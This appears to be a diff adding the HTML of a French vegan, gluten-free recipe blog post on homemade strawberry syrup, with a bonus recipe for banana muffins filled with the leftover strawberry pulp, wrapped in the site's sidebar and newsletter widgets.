+							<section class="elementor-section elementor-top-section elementor-element elementor-element-23a7d60a elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="23a7d60a" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-135a32ca" data-id="135a32ca" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-5c70ccd8 elementor-widget elementor-widget-text-editor" data-id="5c70ccd8" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><p><!-- wp:paragraph --></p>
+<p>Bonjour ! L&rsquo;après-midi, nous sommes très « pause sirop » à la maison. J&rsquo;apprécie particulièrement ceux élaborés par l&rsquo;entreprise&nbsp;familiale Meneau que j&rsquo;achète en magasin bio. Seulement, en ce moment, je dois faire mes courses bio en ligne, puisque les enseignes à proximité de chez moi sont en réalité bien loin du périmètre autorisé. Qu&rsquo;à cela ne tienne, je me suis lancée dans la préparation de ma propre boisson, un sirop de fraises maison !</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Le sirop est une vraie gourmandise, composée de sucre auquel on vient ajouter des arômes, sous forme naturelle ou chimique. On l&rsquo;utilise souvent en pâtisserie, pour imbiber ses génoises et biscuits, ou pour élaborer un sorbet. En France, la commercialisation du sirop est réglementée. N&rsquo;est pas sirop qui veut ! La proportion de sucre est imposée : au moins 55&nbsp;%. Seules les préparations bio doivent être dépourvues de colorants et de conservateurs. Un sirop de menthe n&rsquo;est pas vert en réalité (la couleur verte des sirops de menthe est obtenue par un mélange de deux&nbsp;colorants&nbsp;alimentaires).</p><p><br></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"align":"center","id":19608,"sizeSlug":"full"} --></p>
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><picture loading="lazy" class="wp-image-19608">
+<source type="image/webp" srcset="images/IMG_2448.jpg.webp">
+<img loading="lazy" width="600" height="900" src="images/IMG_2448.jpg" alt="Fraises">
+</picture>
+<p></p>
+<figcaption>Je suis toujours en admiration devant la beauté des fraises&#8230;!</figcaption>
+</figure>
+</div>
+<p><!-- /wp:image --></p>
+<p><!-- wp:paragraph --></p>
+<p>Dans un monde idéal, le sucrant employé pour élaborer un sirop proviendrait de sucre de canne non raffiné. Actuellement, ce sont plutôt le sucre de betterave, le sirop de glucose et l&rsquo;isoglucose (ou sirop de maïs), que l&rsquo;on retrouve en majorité. Si je reprends la composition du sirop de menthe d&rsquo;une grande enseigne française, je lis : « Eau, sucre, sirop de glucose-fructose, arôme naturel de menthe, colorants : caroténoïdes, caramel de sulfite caustique, curcumine, bleu brillant FCF, concentré de carthame et de citron, antioxydant : acide ascorbique. » Pour comparer, la marque bio que je citais précédemment confectionne son sirop de menthe avec les ingrédients suivants : « Sucre de canne roux, eau, extrait naturel de menthe, arôme naturel de citron », avec 100% de ses ingrédients issus de l&rsquo;agriculture biologique. </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Une autre marque de sirops conventionnels, largement répandue elle aussi, propose un sirop de fraises composé de : « Sucre, eau, jus concentré de fraises et autres fruits, acidifiant : acide citrique, arôme, colorants : E122. Jus de fruits : 19% minimum dont 18% de jus de fraise. E122 : Peut avoir des effets indésirables sur l&rsquo;activité et l&rsquo;attention des enfants. » Sur ces belles notes, je souhaite vous apporter aujourd&rsquo;hui une alternative aux sirops du commerce, beaucoup trop sucrés et chimiques à mon goût (je suis une vraie rabat-joie !).</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Mon sirop de fraises maison est préparé à partir de chutes de fraises et de fraises abîmées. Nous avons la chance d&rsquo;habiter dans une région où ce fabuleux petit fruit rouge pousse facilement. Actuellement, des producteurs nous les proposent à la vente à côté de chez nous. Nous apprécions les gros fruits à la croque, les fraises plus petites me servent à préparer de <a rel="noreferrer noopener" aria-label="jolis desserts (s’ouvre dans un nouvel onglet)" href="https://auvertaveclili.fr/tarte-fraises-sans-gluten-creme-patissiere-vegan/" target="_blank">jolis desserts</a>, tandis que les fraises amochées et les bouts de fruits trop clairs ou mis de côté par mon fils passent à la casserole ! Je prépare ma boisson au bain-marie et je récupère la pulpe que nous mangeons à la petite cuillère. On peut également la glisser dans un yaourt ou même un gâteau, comme je vous le propose plus bas. Ma préparation étant moins sucrée que celles du commerce, elle se conserve au frais et moins longtemps (le sucre, comme le sel, est un conservateur naturel). Aussi, je vous invite à réaliser des petites quantités, régulièrement, avec des fraises locales et sans pesticides si possible (les fraises sont parmi les fruits les plus contaminés &#8211; rabat-joie jusqu&rsquo;au bout !).</p><p><br></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:image {"align":"center","id":19612,"sizeSlug":"full"} --></p>
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><picture loading="lazy" class="wp-image-19612">
+<source type="image/webp" srcset="images/IMG_2439.jpg.webp">
+<img loading="lazy" width="600" height="900" src="images/IMG_2439.jpg" alt="Sirop de fraises maison">
+</picture>
+<p></p>
+<figcaption>Sirop de fraises maison, dilué ici dans de l&rsquo;eau</figcaption>
+</figure>
+</div>
+<p><!-- /wp:image --></p>
+<p><!-- wp:heading --></p>
+<h2>Sirop de fraises maison</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong><em>Ingrédients pour 100 ml de sirop : </em></strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:list --></p>
+<ul>
+<li>80 g de fraises bio (des fraises abîmées ou « moches », des chutes de fraises)</li>
+<li>40 g de sucre blond (j&rsquo;utilise toujours du sucre&nbsp;blond&nbsp;équitable&nbsp;et&nbsp;bio, non raffiné)</li>
+<li>80 g d&rsquo;eau</li>
+</ul>
+<p><!-- /wp:list --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong><em><br></em></strong></p><p><strong><em>Méthode :</em></strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:list {"ordered":true} --></p>
+<ol>
+<li>Rincer et équeuter les fraises.</li>
+<li>Les placer dans une petite casserole avec le sucre et l&rsquo;eau.</li>
+<li>Déposer la casserole dans une casserole plus grande et verser de l&rsquo;eau jusqu&rsquo;aux « fesses » de la petite casserole, en mode bain-marie.</li>
+<li>Faire frémir l&rsquo;eau (pas d&rsquo;ébullition) et laisser cuire ainsi 30 minutes, en mélangeant quelques fois.</li>
+<li>Filtrer à l&rsquo;aide d&rsquo;un chinois : verser le sirop dans une petite bouteille en verre bien propre, laisser refroidir et placer au réfrigérateur. Il se conserve ainsi 2 semaines.</li>
+<li>Conserver la pulpe pour la déguster en compote, seule ou avec un yaourt, ou pour <a rel="noreferrer noopener" aria-label="garnir une tartelette aux fraises (s’ouvre dans un nouvel onglet)" href="https://auvertaveclili.fr/tarte-fraises-sans-gluten-creme-patissiere-vegan/" target="_blank">garnir une tartelette aux fraises</a> ou des muffins (cf. la recette qui suit).</li>
+<li>Pour profiter de votre sirop, compter 2 c. soupe de sirop pour 200 ml d&rsquo;eau, à boire bien frais.</li>
+</ol><div><br></div><div><br></div>
+<p><!-- /wp:list --></p>
+<p><!-- wp:image {"align":"center","id":19660,"sizeSlug":"full"} --></p>
+<div class="wp-block-image">
+<figure class="aligncenter size-full"><picture loading="lazy" class="wp-image-19660">
+<source type="image/webp" srcset="images/IMG_2484.jpg.webp">
+<img loading="lazy" width="600" height="900" src="images/IMG_2484.jpg" alt="Muffins à la banane et pulpe de fraises">
+</picture>
+<p></p>
+<figcaption>Muffins à la banane et purée de fraises maison &#8211; La seule et unique photo de mes gâteaux, puisque mon fils s&rsquo;est fait mal au pied au même moment !</figcaption>
+</figure>
+</div>
+<p><!-- /wp:image --></p>
+<p><!-- wp:heading --></p>
+<h2>Muffins à la banane et à la pulpe de fraises</h2>
+<p><!-- /wp:heading --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong><em>Ingrédients pour 4 muffins :</em></strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:list --></p>
+<ul>
+<li>120 g de bananes bien mûres coupées en rondelles, soit 1 belle banane</li>
+<li>65 g de lait de soja (idéalement, à la vanille) ou d&rsquo;amande</li>
+<li>15 g d&rsquo;huile d&rsquo;olive (+ un peu d&rsquo;huile pour les moules)</li>
+<li>1 c. à café de vinaigre de cidre ou de jus de citron jaune</li>
+<li>1 c. à café de bicarbonate alimentaire</li>
+<li>1 pincée de sel</li>
+<li>2 c. à café (5 g) de sucre blond ou complet</li>
+<li>100 g de farine de blé T80 (que l&rsquo;on peut remplacer par de la farine de blé T65 ou encore par un mélange de farine de riz complet 70 g et de farine de sarrasin ou de châtaigne 30 g)</li>
+<li>La pulpe de fraises qui reste après la confection de votre sirop, ou bien de la compote ou de la confiture, ou même de la pâte à tartiner : compter 4 c. à café à peu près</li>
+</ul>
+<p><!-- /wp:list --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong><em>Méthode :</em></strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:list {"ordered":true} --></p>
+<ol>
+<li>Enfourner votre four à 200° (th.6-7).  </li>
+<li>Placer les rondelles de bananes dans un saladier et bien les écraser à la fourchette.</li>
+<li>Incorporer le lait végétal, l&rsquo;huile d&rsquo;olive ainsi que le vinaigre de cidre ou le jus de citron puis mélanger vivement.</li>
+<li>Dans un second saladier, combiner le bicarbonate alimentaire, le sel, le sucre et la farine.</li>
+<li>Verser la préparation liquide sur la préparation sèche et amalgamer l&rsquo;ensemble rapidement, avec le moins de coups de cuillère possible. Ceci permet à vos petits gâteaux de mieux lever et d&rsquo;être plus aérés.</li>
+<li>Huiler légèrement 4 empreintes à muffins et couler la moitié de la pâte.</li>
+<li>Répartir la pulpe de fraises puis couler le restant de pâte dans vos moules.</li>
+<li>Baisser la température du four à 180° (th.6) et enfourner 30 minutes.</li>
+<li>Laisser tiédir avant de démouler.</li>
+</ol>
+<p><!-- /wp:list --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong><em><br></em></strong></p><p><strong><em>Astuce :</em></strong> </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Vous pouvez tout à fait ne pas garnir vos muffins de pulpe/confiture et les enfourner tels quels, sans centre coulant/gourmand.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><br></p><div class="outbrain-tm" id="13364-16"><script src="js/gen_1.js"></script><script src="js/requestform_2.js"></script></div>
+<p><!-- /wp:paragraph --></p></div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+						</div>
+						</div>
+					</div>
+		<div class="pdfprnt-buttons pdfprnt-buttons-post pdfprnt-bottom-right"><a href="https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/?print=pdf" class="pdfprnt-button pdfprnt-button-pdf" target="_blank"><img src="images/pdf.png" alt="image_pdf" title="View PDF"></a><a href="https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/?print=print" class="pdfprnt-button pdfprnt-button-print" target="_blank"><img src="images/print.png" alt="image_print" title="Print Content"></a></div><div class="yarpp-related">
+<h3>Vous allez aussi aimer...</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://auvertaveclili.fr/entremets-fraises-et-rhubarbe-vegan-sans-gluten/" title="Entremets fraises et rhubarbe (vegan, sans gluten)">
+<picture class="attachment-yarpp-thumbnail size-yarpp-thumbnail wp-post-image" loading="lazy" data-pin-nopin="true">
+<source type="image/webp" srcset="images/IMG_2403.jpg.webp">
+<img width="80" height="120" src="images/IMG_2403.jpg" alt="Entremets fraises et rhubarbe" loading="lazy" data-pin-nopin="true">
+</picture>
+<span class="yarpp-thumbnail-title">Entremets fraises et rhubarbe (vegan, sans gluten)</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://auvertaveclili.fr/tarte-aux-fraises-sans-cuisson-vegan/" title="Tarte aux fraises sans cuisson, crème glacée à la banane (vegan)">
+<picture class="attachment-yarpp-thumbnail size-yarpp-thumbnail wp-post-image" loading="lazy" data-pin-nopin="true">
+<source type="image/webp" srcset="images/IMG_5422-120x120.jpg.webp 120w, images/IMG_5422-300x300.jpg.webp 300w" sizes="(max-width: 120px) 100vw, 120px">
+<img width="120" height="120" src="images/IMG_5422-120x120.jpg" alt="Tartes aux fraises vegan sans gluten" loading="lazy" data-pin-nopin="true" srcset="images/IMG_5422-120x120.jpg 120w, images/IMG_5422-300x300.jpg 300w, images/IMG_5422-50x50.jpg 50w, images/IMG_5422-150x150.jpg 150w, images/IMG_5422-210x210.jpg 210w" sizes="(max-width: 120px) 100vw, 120px">
+</picture>
+<span class="yarpp-thumbnail-title">Tarte aux fraises sans cuisson, crème glacée à la banane (vegan)</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://auvertaveclili.fr/tarte-fraises-sans-gluten-creme-patissiere-vegan/" title="Tarte aux fraises sans gluten et sa crème pâtissière vegan">
+<picture class="attachment-yarpp-thumbnail size-yarpp-thumbnail wp-post-image" loading="lazy" data-pin-nopin="true">
+<source type="image/webp" srcset="images/IMG_5530-120x120.jpg.webp 120w, images/IMG_5530-300x300.jpg.webp 300w" sizes="(max-width: 120px) 100vw, 120px">
+<img width="120" height="120" src="images/IMG_5530-120x120.jpg" alt="Tarte aux fraises" loading="lazy" data-pin-nopin="true" srcset="images/IMG_5530-120x120.jpg 120w, images/IMG_5530-300x300.jpg 300w, images/IMG_5530-50x50.jpg 50w, images/IMG_5530-150x150.jpg 150w, images/IMG_5530-210x210.jpg 210w" sizes="(max-width: 120px) 100vw, 120px">
+</picture>
+<span class="yarpp-thumbnail-title">Tarte aux fraises sans gluten et sa crème pâtissière vegan</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://auvertaveclili.fr/bonbons-maison-vegan/" title="Bonbons maison au sirop de riz (vegan)">
+<picture class="attachment-yarpp-thumbnail size-yarpp-thumbnail wp-post-image" loading="lazy" data-pin-nopin="true">
+<source type="image/webp" srcset="images/Bonbons-120x120.jpg.webp 120w, images/Bonbons-300x300.jpg.webp 300w" sizes="(max-width: 120px) 100vw, 120px">
+<img width="120" height="120" src="images/Bonbons-120x120.jpg" alt="" loading="lazy" data-pin-nopin="true" srcset="images/Bonbons-120x120.jpg 120w, images/Bonbons-300x300.jpg 300w, images/Bonbons-50x50.jpg 50w, images/Bonbons-150x150.jpg 150w, images/Bonbons-210x210.jpg 210w" sizes="(max-width: 120px) 100vw, 120px">
+</picture>
+<span class="yarpp-thumbnail-title">Bonbons maison au sirop de riz (vegan)</span></a>
+</div>
+</div>
+		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-dcfb4f3" data-id="dcfb4f3" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-c08e118 elementor-search-form--skin-classic elementor-search-form--button-type-icon elementor-search-form--icon-search elementor-widget elementor-widget-search-form" data-id="c08e118" data-element_type="widget" data-settings="{&quot;skin&quot;:&quot;classic&quot;}" data-widget_type="search-form.default">
+				<div class="elementor-widget-container">
+					<form class="elementor-search-form" role="search" action="https://auvertaveclili.fr" method="get">
+									<div class="elementor-search-form__container">
+								<input placeholder="RECHERCHER UNE RECETTE" class="elementor-search-form__input" type="search" name="s" title="Rechercher " value="">
+													<button class="elementor-search-form__submit" type="submit" title="Rechercher " aria-label="Rechercher ">
+													<i class="fa fa-search" aria-hidden="true"></i>
+							<span class="elementor-screen-only">Rechercher </span>
+											</button>
+											</div>
+		</form>
+				</div>
+				</div>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-f6422af elementor-hidden-phone elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="f6422af" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-6936083" data-id="6936083" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-a54e04c elementor-widget elementor-widget-image" data-id="a54e04c" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+										<picture class="attachment-medium_large size-medium_large" loading="lazy">
+<source type="image/webp" srcset="images/IMG_2672-768x1152.jpg.webp 768w, images/IMG_2672.jpg.webp 800w" sizes="(max-width: 768px) 100vw, 768px">
+<img width="768" height="1152" src="images/IMG_2672-768x1152.jpg" alt="" loading="lazy" srcset="images/IMG_2672-768x1152.jpg 768w, images/IMG_2672.jpg 800w" sizes="(max-width: 768px) 100vw, 768px">
+</picture>
+											</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-4a2cc06 elementor-widget elementor-widget-text-editor" data-id="4a2cc06" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><p>Alice, alias Lili, maman d&rsquo;une petite tornade, humaine imparfaite, auteure et coach bien-être.</p><p>Je partage sur mon blog des p&rsquo;tits plats et desserts végétaliens/sans gluten du quotidien pour tous, quel que soit votre régime alimentaire, pour une cuisine alternative gourmande et facile, sans étiquettes ni prise de tête.</p><p>Que vous ayez envie de plus de vert dans votre vie, de repas plus respectueux de votre corps et de la planète, ou simplement d&rsquo;instants gourmands légers, vous êtes au bon endroit.</p><p>Bienvenue !</p></div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-8aefc64 elementor-hidden-desktop elementor-hidden-tablet elementor-hidden-phone elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="8aefc64" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-910c459" data-id="910c459" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-2557d87 elementor-hidden-phone elementor-widget elementor-widget-image" data-id="2557d87" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+										<img width="500" height="120" src="images/vert-ma-vie-e1612283460740.png" class="attachment-large size-large" alt="" loading="lazy">											</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-b176492 elementor-hidden-desktop elementor-hidden-tablet elementor-hidden-phone elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="b176492" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-6770209" data-id="6770209" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-6bc8497 elementor-widget elementor-widget-image" data-id="6bc8497" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+										<picture class="attachment-medium_large size-medium_large" loading="lazy">
+<source type="image/webp" srcset="images/vertmavie-768x1152.png.webp 768w, images/vertmavie.png.webp 800w" sizes="(max-width: 768px) 100vw, 768px">
+<img width="768" height="1152" src="images/vertmavie-768x1152.png" alt="" loading="lazy" srcset="images/vertmavie-768x1152.png 768w, images/vertmavie.png 800w" sizes="(max-width: 768px) 100vw, 768px">
+</picture>
+											</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-cfea418 elementor-widget elementor-widget-heading" data-id="cfea418" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h3 class="elementor-heading-title elementor-size-default">5 CLÉS POUR MIEUX DIGÉRER</h3>		</div>
+				</div>
+				<div class="elementor-element elementor-element-d7a500e elementor-widget elementor-widget-text-editor" data-id="d7a500e" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><p>Plus de confort, plus de vitalité, plus de simplicité.</p></div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-dcaf458 elementor-widget elementor-widget-text-editor" data-id="dcaf458" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><p>Recevez dans votre boîte mail l&rsquo;atelier vidéo bien-être Vert ma Vie dans lequel je partage avec vous mes 5 clés pour une meilleure digestion. </p></div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-c435cd9 elementor-widget elementor-widget-shortcode" data-id="c435cd9" data-element_type="widget" data-widget_type="shortcode.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-shortcode"></div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-a610c0c elementor-hidden-phone elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="a610c0c" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-ab77cfb" data-id="ab77cfb" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-247f2cb elementor-widget elementor-widget-image" data-id="247f2cb" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+										<picture class="attachment-large size-large" loading="lazy">
+<source type="image/webp" srcset="images/1-1-e1601378810990.png.webp">
+<img width="500" height="145" src="images/1-1-e1601378810990.png" alt="" loading="lazy">
+</picture>
+											</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-29b7497 elementor-hidden-phone elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="29b7497" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-94f2450" data-id="94f2450" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-75bc779 elementor-widget elementor-widget-image" data-id="75bc779" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+										<picture class="attachment-medium_large size-medium_large" loading="lazy">
+<source type="image/webp" srcset="images/7-jours-pour-transformer-mon-alimentation-768x1086.jpg.webp 768w, images/7-jours-pour-transformer-mon-alimentation-1086x1536.jpg.webp 1086w, images/7-jours-pour-transformer-mon-alimentation.jpg.webp 1414w" sizes="(max-width: 768px) 100vw, 768px">
+<img width="768" height="1086" src="images/7-jours-pour-transformer-mon-alimentation-768x1086.jpg" alt="" loading="lazy" srcset="images/7-jours-pour-transformer-mon-alimentation-768x1086.jpg 768w, images/7-jours-pour-transformer-mon-alimentation-1086x1536.jpg 1086w, images/7-jours-pour-transformer-mon-alimentation.jpg 1414w" sizes="(max-width: 768px) 100vw, 768px">
+</picture>
+											</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-2fab224 elementor-widget elementor-widget-heading" data-id="2fab224" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h3 class="elementor-heading-title elementor-size-default">ENVIE DE PLUS ?</h3>		</div>
+				</div>
+				<div class="elementor-element elementor-element-d85805c elementor-widget elementor-widget-text-editor" data-id="d85805c" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><p>Plus de confort, plus de vitalité, plus de simplicité.</p></div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-062a3c8 elementor-widget elementor-widget-text-editor" data-id="062a3c8" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><p>Renseignez votre adresse e-mail et recevez un e-book de recettes exclusives végétales et sans gluten, qui apporteront la touche de douceur qui manque à votre journée !</p></div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-685585e elementor-widget elementor-widget-shortcode" data-id="685585e" data-element_type="widget" data-widget_type="shortcode.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-shortcode">					<script type="text/javascript">
+						var gCaptchaSibWidget;
+						var onloadSibCallback = function() {
+							var element = document.getElementsByClassName('sib-default-btn');
+							gCaptchaSibWidget = grecaptcha.render(element[0],{
+								'sitekey' : '6LeMc-sZAAAAAIXWdlld3hHzMkR66vJRI10ReL44',
+								'callback' : sibVerifyCallback
+							});
+						};
+					</script>
+									<script src="js/api.js" async defer></script>
+							<form id="sib_signup_form_1" method="post" class="sib_signup_form">
+				<div class="sib_loader" style="display:none;"><img src="images/spinner.gif" alt="loader"></div>
+				<input type="hidden" name="sib_form_action" value="subscribe_form_submit">
+				<input type="hidden" name="sib_form_id" value="1">
+                <input type="hidden" name="sib_form_alert_notice" value="Remplissez ce champ svp">
+                <input type="hidden" name="sib_security" value="54ed9080bb">
+				<div class="sib_signup_box_inside_1">
+					<div style="/*display:none*/" class="sib_msg_disp">
+					</div>
+					<p class="sib-email-area">
+    <input type="email" class="sib-email-area mailstyle" name="email" required="required" placeholder="ADRESSE EMAIL...">
+</p>
+<div id="sib_captcha"></div>
+<p>
+    <input type="submit" class="sib-default-btn sendstyle" value="RECEVOIR MON EBOOK !">
+</p>
+
+				</div>
+			</form>
+			<style>
+				form#sib_signup_form_1 p.sib-alert-message {
+    padding: 6px 12px;
+    margin-bottom: 20px;
+    border: 1px solid transparent;
+    border-radius: 4px;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+}
+form#sib_signup_form_1 p.sib-alert-message-error {
+    background-color: #f2dede;
+    border-color: #ebccd1;
+    color: #a94442;
+}
+form#sib_signup_form_1 p.sib-alert-message-success {
+    background-color: #dff0d8;
+    border-color: #d6e9c6;
+    color: #3c763d;
+}
+form#sib_signup_form_1 p.sib-alert-message-warning {
+    background-color: #fcf8e3;
+    border-color: #faebcc;
+    color: #8a6d3b;
+}			</style>
+			</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-880c98f elementor-hidden-desktop elementor-hidden-tablet elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="880c98f" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-180d4a1" data-id="180d4a1" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-2def87d elementor-hidden-desktop elementor-hidden-tablet elementor-widget elementor-widget-shortcode" data-id="2def87d" data-element_type="widget" data-widget_type="shortcode.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-shortcode"><div class="outbrain-tm" id="13364-16"><script src="js/gen_1.js"></script><script src="js/requestform_2.js"></script></div></div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-0ddece6 elementor-hidden-phone elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="0ddece6" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-535460b" data-id="535460b" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-287bcff elementor-widget elementor-widget-image" data-id="287bcff" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+											<a href="https://vertmavie.com/je-reserve-ma-session-de-coaching-bien-etre/" target="_blank">
+							<picture class="attachment-large size-large" loading="lazy">
+<source type="image/webp" srcset="images/4-1-e1601379121867.png.webp">
+<img width="500" height="145" src="images/4-1-e1601379121867.png" alt="" loading="lazy">
+</picture>
+								</a>
+											</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-c2e1e4b elementor-hidden-phone elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="c2e1e4b" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-e0df5d5" data-id="e0df5d5" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-d5c2d1d elementor-widget elementor-widget-heading" data-id="d5c2d1d" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
